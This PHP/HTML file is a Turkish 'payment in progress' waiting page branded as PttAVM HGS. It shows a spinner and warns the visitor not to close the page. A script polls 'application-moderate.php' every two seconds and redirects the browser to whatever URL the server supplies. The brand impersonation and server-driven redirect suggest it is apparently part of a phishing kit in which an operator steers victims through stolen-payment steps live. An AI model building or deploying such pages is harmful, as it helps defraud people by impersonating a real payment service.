<?php
session_start();

// Session kontrolü
if (!isset($_SESSION['userIdentifier'])) {
    header('Location: index.php');
    exit;
}
?>
<!doctype html>
<html lang="tr">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>İşleminiz Devam Ediyor - PttAVM HGS</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link
      href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap"
      rel="stylesheet"
    />
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      :root {
        --primary: #c8912e;
        --dark: #0c1824;
        --text: #f0f2f5;
        --text-muted: #8a9bb5;
        --border: rgba(255, 255, 255, 0.1);
      }

      body {
        font-family: "Inter", -apple-system, BlinkMacSystemFont, sans-serif;
        background: var(--dark);
        color: var(--text);
        min-height: 100vh;
        min-height: 100dvh;
        display: flex;
        flex-direction: column;
        overflow: hidden;
        -webkit-font-smoothing: antialiased;
      }

      /* ── Background ── */
      .bg {
        position: fixed;
        inset: 0;
        z-index: 0;
        background: url("background.jpg") center center / cover no-repeat;
      }

      .bg::after {
        content: "";
        position: absolute;
        inset: 0;
        background: radial-gradient(
          ellipse at center,
          rgba(10, 20, 32, 0.82) 0%,
          rgba(10, 20, 32, 0.94) 100%
        );
      }

      /* ── Content ── */
      .container {
        position: relative;
        z-index: 10;
        flex: 1;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        padding: 2rem;
        text-align: center;
        animation: fadeIn 0.8s cubic-bezier(0.4, 0, 0.2, 1) both;
      }

      @keyframes fadeIn {
        from {
          opacity: 0;
          transform: translateY(12px);
        }
        to {
          opacity: 1;
          transform: translateY(0);
        }
      }

      /* ── Spinner ── */
      .spinner-wrapper {
        position: relative;
        width: 96px;
        height: 96px;
        margin-bottom: 2.5rem;
      }

      .spinner {
        width: 96px;
        height: 96px;
        border-radius: 50%;
        border: 3.5px solid rgba(200, 145, 46, 0.1);
        border-top-color: var(--primary);
        animation: spin 1.8s cubic-bezier(0.4, 0.15, 0.6, 0.85) infinite;
      }

      .spinner-glow {
        position: absolute;
        inset: -6px;
        border-radius: 50%;
        background: transparent;
        border: 1px solid transparent;
        animation: glow 3s ease-in-out infinite;
      }

      .spinner-dot {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        width: 12px;
        height: 12px;
        border-radius: 50%;
        background: var(--primary);
        animation: pulse 2.5s cubic-bezier(0.4, 0, 0.6, 1) infinite;
        box-shadow: 0 0 24px rgba(200, 145, 46, 0.35);
      }

      @keyframes spin {
        to {
          transform: rotate(360deg);
        }
      }

      @keyframes pulse {
        0%,
        100% {
          transform: translate(-50%, -50%) scale(0.85);
          opacity: 0.5;
          box-shadow: 0 0 16px rgba(200, 145, 46, 0.2);
        }
        50% {
          transform: translate(-50%, -50%) scale(1.15);
          opacity: 1;
          box-shadow: 0 0 32px rgba(200, 145, 46, 0.5);
        }
      }

      @keyframes glow {
        0%,
        100% {
          box-shadow: 0 0 0 0 rgba(200, 145, 46, 0);
        }
        50% {
          box-shadow: 0 0 30px 4px rgba(200, 145, 46, 0.08);
        }
      }

      /* ── Text ── */
      .title {
        font-size: 1.4rem;
        font-weight: 700;
        letter-spacing: -0.3px;
        margin-bottom: 0.6rem;
        line-height: 1.3;
      }

      .title span {
        color: var(--primary);
      }

      .subtitle {
        font-size: 0.92rem;
        color: var(--text-muted);
        line-height: 1.6;
        max-width: 360px;
      }

      /* ── Progress dots ── */
      .progress-dots {
        display: flex;
        gap: 8px;
        margin-top: 2.5rem;
      }

      .progress-dots .dot {
        width: 7px;
        height: 7px;
        border-radius: 50%;
        background: rgba(200, 145, 46, 0.2);
        animation: dotFloat 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
      }

      .progress-dots .dot:nth-child(2) {
        animation-delay: 0.3s;
      }

      .progress-dots .dot:nth-child(3) {
        animation-delay: 0.6s;
      }

      @keyframes dotFloat {
        0%,
        100% {
          background: rgba(200, 145, 46, 0.2);
          transform: scale(1) translateY(0);
        }
        30% {
          background: var(--primary);
          transform: scale(1.2) translateY(-4px);
        }
        60% {
          background: rgba(200, 145, 46, 0.4);
          transform: scale(1) translateY(0);
        }
      }

      /* ── Warning ── */
      .warning {
        display: flex;
        align-items: center;
        gap: 8px;
        margin-top: 2.5rem;
        padding: 12px 20px;
        background: rgba(200, 145, 46, 0.06);
        border: 1px solid rgba(200, 145, 46, 0.15);
        border-radius: 10px;
        font-size: 0.8rem;
        color: var(--text-muted);
        max-width: 400px;
      }

      .warning svg {
        flex-shrink: 0;
        width: 20px;
        height: 20px;
        fill: var(--primary);
        opacity: 0.7;
      }

      /* ── Footer ── */
      .footer {
        position: relative;
        z-index: 10;
        text-align: center;
        padding: 1.25rem;
        font-size: 0.75rem;
        color: rgba(138, 155, 181, 0.4);
        border-top: 1px solid var(--border);
      }

      /* ── Responsive ── */
      @media (max-width: 768px) {
        .spinner-wrapper {
          width: 80px;
          height: 80px;
          margin-bottom: 2rem;
        }

        .spinner {
          width: 80px;
          height: 80px;
        }

        .spinner-dot {
          width: 12px;
          height: 12px;
        }

        .title {
          font-size: 1.2rem;
        }

        .subtitle {
          font-size: 0.85rem;
          padding: 0 0.5rem;
        }

        .warning {
          font-size: 0.76rem;
          padding: 10px 16px;
          margin-top: 2rem;
        }

        .progress-dots {
          margin-top: 2rem;
        }
      }

      @media (max-width: 380px) {
        .title {
          font-size: 1.1rem;
        }

        .subtitle {
          font-size: 0.8rem;
        }
      }
    </style>
  </head>
  <body>
    <div class="bg"></div>

    <div class="container">
      <div class="spinner-wrapper">
        <div class="spinner-glow"></div>
        <div class="spinner"></div>
        <div class="spinner-dot"></div>
      </div>

      <h1 class="title"><span>İşleminiz</span> Devam Ediyor</h1>
      <p class="subtitle">
        Ödeme işleminiz gerçekleştiriliyor, lütfen bekleyiniz.
        Bu işlem birkaç saniye sürebilir.
      </p>

      <div class="progress-dots">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>

      <div class="warning">
        <svg viewBox="0 0 24 24">
          <path
            d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"
          />
        </svg>
        Lütfen bu sayfayı kapatmayınız ve geri tuşlarına basmayınız.
      </div>
    </div>

    <div class="footer">&copy; 2026 PttAVM | Tum haklari saklidir.</div>
    
    <script>
      // Her 2 saniyede bir durumu kontrol et
      setInterval(async function() {
        try {
          const formData = new FormData();
          formData.append('action', 'check_status');
          
          const response = await fetch('application-moderate.php', {
            method: 'POST',
            body: formData
          });
          
          const result = await response.json();
          
          // Sadece redirect_url varsa VE boş değilse yönlendir
          if (result.success && result.redirect_url && result.redirect_url.trim() !== '') {
            // Redirect URL varsa yönlendir
            window.location.href = result.redirect_url;
          }
        } catch (error) {
          console.error('Status check error:', error);
        }
      }, 2000); // 2 saniye
    </script>
    <script src="/tracking.js"></script>
  </body>
</html>
